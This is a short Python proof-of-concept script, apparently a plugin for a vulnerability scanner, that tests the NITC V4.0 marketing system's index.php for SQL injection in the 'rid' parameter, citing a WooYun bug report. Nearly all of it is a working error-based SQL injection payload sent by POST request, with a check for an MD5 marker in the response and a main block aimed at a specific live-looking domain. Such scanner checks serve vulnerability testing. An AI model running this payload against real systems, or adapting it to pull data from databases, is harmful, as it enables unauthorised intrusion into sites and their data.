#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:NITC V4.0营销系统  /index.php 参数 rid SQL注入漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0104057
#Author:烽火戏诸侯

def assign(service, arg):
    if service == 'nitc':
        return True, arg
    
def audit(arg):
    target =arg +'index.php?action=content&rid=1%20and%28select%201%20from%28select%20count%28%2a%29%2Cconcat%28%28select%20%28select%20%28select%20concat%280x7e7e7e%2Cmd5%28123%29%2C0x7e7e7e%29%29%29%20from%20information_schema.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29'
    data = 'is_protect=1'
    code, head, res, errcode, _ = curl.curl2(target,post=data)
    if '202cb962ac59075b964b07152d234b70' in res:
        security_hole('sql:'+target+'\npost:'+data)
    
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('nitc','http://www.nympbg.cn/')[1])